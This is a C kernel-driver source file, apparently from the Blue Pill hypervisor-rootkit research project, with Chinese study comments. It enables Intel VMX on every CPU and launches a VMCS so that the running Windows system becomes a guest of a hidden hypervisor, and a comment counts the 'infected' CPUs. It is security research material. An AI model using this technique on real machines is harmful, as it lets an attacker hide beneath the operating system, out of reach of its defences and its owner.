/* 
 * Copyright holder: Invisible Things Lab
 */

#include "hvm.h"

ULONG g_uSubvertedCPUs;
CPU cpu[32];

NTSTATUS HvmSubvertCpu (
  PVOID GuestRsp
)
{
    PCPU pCpu = &cpu[KeGetCurrentProcessorNumber ()];
    ULONG_PTR VMM_Stack;
    PHYSICAL_ADDRESS PhyAddr;

    KdPrint (("HvmSubvertCpu(): Running on processor #%d\n", KeGetCurrentProcessorNumber ()));

    // 检查IA32_FEATURE_CONTROL寄存器的Lock位
    if (!(__readmsr(MSR_IA32_FEATURE_CONTROL) & FEATURE_CONTROL_LOCKED))
    {
        KdPrint(("VmxInitialize() IA32_FEATURE_CONTROL bit[0] = 0!\n"));
        return STATUS_UNSUCCESSFUL;
    }

    // 检查IA32_FEATURE_CONTROL寄存器的Enable VMX outside SMX位
    if (!(__readmsr(MSR_IA32_FEATURE_CONTROL) & FEATURE_CONTROL_VMXON_ENABLED))
    {
        KdPrint(("VmxInitialize() IA32_FEATURE_CONTROL bit[2] = 0!\n"));
        return STATUS_UNSUCCESSFUL;
    }

    PhyAddr.QuadPart = -1;
    //
    // 为VMXON结构分配空间 (Allocate VMXON region)
    //
    pCpu->OriginaVmxonR = MmAllocateContiguousMemory(PAGE_SIZE, PhyAddr);
    if (!pCpu->OriginaVmxonR)
    {
        KdPrint (("VmxInitialize(): Failed to allocate memory for original VMXON\n"));
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    RtlZeroMemory (pCpu->OriginaVmxonR, PAGE_SIZE);

    //
    // 为VMCS结构分配空间 (Allocate VMCS)
    //
    pCpu->OriginalVmcs = MmAllocateContiguousMemory(PAGE_SIZE, PhyAddr);
    if (!pCpu->OriginalVmcs)
    {
        KdPrint (("VmxInitialize(): Failed to allocate memory for original VMCS\n"));
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    RtlZeroMemory (pCpu->OriginalVmcs, PAGE_SIZE);

    // 为Guest分配内核栈(按页分配), 大小与Host相同
    pCpu->VMM_Stack = ExAllocatePoolWithTag (NonPagedPool, 2 * PAGE_SIZE, MEM_TAG);
    if (!pCpu->VMM_Stack)
    {
        KdPrint (("HvmSubvertCpu(): Failed to allocate host stack!\n"));
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    RtlZeroMemory (pCpu->VMM_Stack, 2 * PAGE_SIZE);

  //
  // 准备VM要用到的数据结构 (VMXON & VMCS )
  // GuestRip和GuestRsp会被填进VMCS结构，代表Guest原本的代码位置和栈顶指针
  //

  set_in_cr4 (X86_CR4_VMXE);
  *(ULONG64 *) pCpu->OriginaVmxonR = (__readmsr(MSR_IA32_VMX_BASIC) & 0xffffffff); //set up vmcs_revision_id
  *(ULONG64 *) pCpu->OriginalVmcs  = (__readmsr(MSR_IA32_VMX_BASIC) & 0xffffffff); 

  PhyAddr = MmGetPhysicalAddress(pCpu->OriginaVmxonR);
  if (__vmx_on (&PhyAddr))
  {
      KdPrint (("VmxOn Failed!\n"));
      return STATUS_UNSUCCESSFUL;
  }

  //============================= 配置VMCS ================================
  PhyAddr = MmGetPhysicalAddress(pCpu->OriginalVmcs);
  __vmx_vmclear (&PhyAddr);  // 取消当前的VMCS的激活状态
  __vmx_vmptrld (&PhyAddr);  // 加载新的VMCS并设为激活状态

  VMM_Stack = (ULONG_PTR)pCpu->VMM_Stack + 2 * PAGE_SIZE - 8;
  if ( VmxSetupVMCS (VMM_Stack, CmGuestEip, GuestRsp) )
  {
      KdPrint (("VmxSetupVMCS() failed!"));
      __vmx_off ();
      clear_in_cr4 (X86_CR4_VMXE);
      return STATUS_UNSUCCESSFUL;
  }

  InterlockedIncrement (&g_uSubvertedCPUs);  // 已侵染的CPU数+=1

  // 一切准备工作完毕，使该CPU进入虚拟机
  __vmx_vmlaunch();

  // never reached
  InterlockedDecrement (&g_uSubvertedCPUs);
  return STATUS_SUCCESS;
}

NTSTATUS
HvmSpitOutBluepill ()
{
    KIRQL OldIrql;
    CHAR i;

    // 遍历所有处理器
    for (i = 0; i < KeNumberProcessors; i++)
    {
        KeSetSystemAffinityThread ((KAFFINITY) ((ULONG_PTR)1 << i));  // 将代码运行在指定CPU
        OldIrql = KeRaiseIrqlToDpcLevel ();

        VmxVmCall (NBP_HYPERCALL_UNLOAD);

        KeLowerIrql (OldIrql);
        KeRevertToUserAffinityThread ();
    }

    return STATUS_SUCCESS;
}

NTSTATUS
HvmSwallowBluepill ()
{
    NTSTATUS Status;
    KIRQL OldIrql;
    CHAR i;

    // 遍历所有处理器
    for (i = 0; i < KeNumberProcessors; i++)
    {
        KeSetSystemAffinityThread ((KAFFINITY) ((ULONG_PTR)1 << i));  // 将代码运行在指定CPU
        OldIrql = KeRaiseIrqlToDpcLevel ();

        Status = CmSubvert (NULL);  // CmSubvert的流程是保存所有寄存器(除了段寄存器)的内容到栈里后，调用HvmSubvertCpu

        KeLowerIrql (OldIrql);
        KeRevertToUserAffinityThread ();

        if (Status)
        {
            KdPrint (("HvmSwallowBluepill(): CmSubvert() failed with status 0x%08hX\n", Status));
            break;
        }
    }

    if (KeNumberProcessors != g_uSubvertedCPUs)  // 如果没有对每个核都侵染成功，则撤销更改
    {
        HvmSpitOutBluepill ();
        return STATUS_UNSUCCESSFUL;
    }

    return Status;
}
